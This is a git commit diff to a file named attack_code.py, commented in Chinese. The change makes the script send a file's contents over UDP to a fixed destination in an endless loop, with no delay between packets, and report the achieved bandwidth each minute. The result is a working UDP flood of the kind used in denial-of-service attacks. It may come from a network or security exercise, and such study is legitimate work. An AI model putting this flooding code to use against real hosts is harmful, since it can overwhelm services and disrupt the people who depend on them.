7d46c7c35b70400e5ee467b4b66f5f9c28a37aac
robot1525 <73985895+robot1525@users.noreply.github.com>
2020-12-18 20:26:03 +0800

    Update attack_code.py

--- attack_code.py
+++ attack_code.py
@@ -17,13 +17,22 @@ send_data = f.read()
 f.close()
 
 # 4. 发送数据到指定的电脑上的指定程序中
-#volume_list = [v for v in range(10, 35, 5)]
-#for v in volume_list:
-    #for i in range(2 ** v):
-        #udp_socket.sendto(send_data.encode('utf-8'), dest_addr)
-        #time.sleep(120)
+'''
+volume_list = [v for v in range(10, 35, 5)]
+for v in volume_list:
+    for i in range(2 ** v):
+        udp_socket.sendto(send_data.encode('utf-8'), dest_addr)
+        time.sleep(120)
+'''
+packet_count = 0
+now = 0
+time_begin = time.time()
 while True:
     udp_socket.sendto(send_data.encode('utf-8'), dest_addr)
-     
+    packet_count += 1
+    if (time.time() - time_begin) // 60 > now:
+        print("Bandwidth: %.6f Mbps" % ((packet_count * len(send_data) * 8) / (time.time() - time_begin) / (2 ** 20)))
+        now += 1
+
 # 5. 关闭套接字
 udp_socket.close()
